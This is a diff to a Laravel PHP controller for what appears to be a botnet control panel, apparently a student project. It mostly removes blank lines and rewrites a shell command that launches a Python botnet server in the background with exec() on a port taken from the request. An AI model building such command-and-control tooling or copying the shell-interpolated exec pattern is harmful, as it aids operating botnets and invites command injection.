@@ -9,10 +9,6 @@ use Illuminate\Support\Facades\DB;
 
 class HomeController extends Controller
 {
-
-
-
-
     public function index()
     {
         $username = auth()->user()->prenom;
@@ -35,8 +31,6 @@ class HomeController extends Controller
 
         // Récupérer le nombre de groupes créés
         $networkCount = Network::count();
-
-
         
         $nomProcessus = "python3";
 
@@ -56,7 +50,6 @@ class HomeController extends Controller
             $status_botnet = false;
         }
 
-
         return view('home', [
             'username' => $username,
             'name' => $name,
@@ -65,7 +58,6 @@ class HomeController extends Controller
             'networkCount' => $networkCount,
         ])->with('botnet_status', $status_botnet);
     }
-
 
     public function aide_botnet()
     {
@@ -81,8 +73,6 @@ class HomeController extends Controller
         
     }
 
-
-
     public function start_botnet(Request $request)
     {
         // Récupérer le port du formulaire
@@ -94,9 +84,7 @@ class HomeController extends Controller
         }
     
         // Commande pour activer l'environnement virtuel et démarrer le serveur Python avec le port spécifié
-        $command = "bash -c 'nohup source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && nohup python3 /home/debian/PA-BOTNET-PYSRV/main.py --start --port $port > /dev/null 2>&1 & echo $!'";
-
-    
+        $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --start --port $port > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
         exec($command, $output, $return);
     
         // Le PID du processus lancé
